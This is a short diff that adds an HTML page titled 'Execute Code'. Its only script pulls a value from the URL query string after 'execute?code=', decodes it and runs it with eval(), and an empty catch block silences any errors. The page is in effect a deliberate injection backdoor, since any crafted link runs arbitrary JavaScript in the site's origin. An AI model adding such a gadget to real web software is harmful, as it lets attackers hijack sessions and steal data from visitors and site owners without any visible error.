@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Execute Code</title>
+</head>
+<body>
+<script>
+(function() {
+  const s = window.location.search;
+  const m = s.match(/execute\?code=(.*)$/);
+  if (!m) return;
+  try {
+    eval(decodeURIComponent(m[1]));
+  } catch {}
+})();
+</script>
+</body>
+</html>
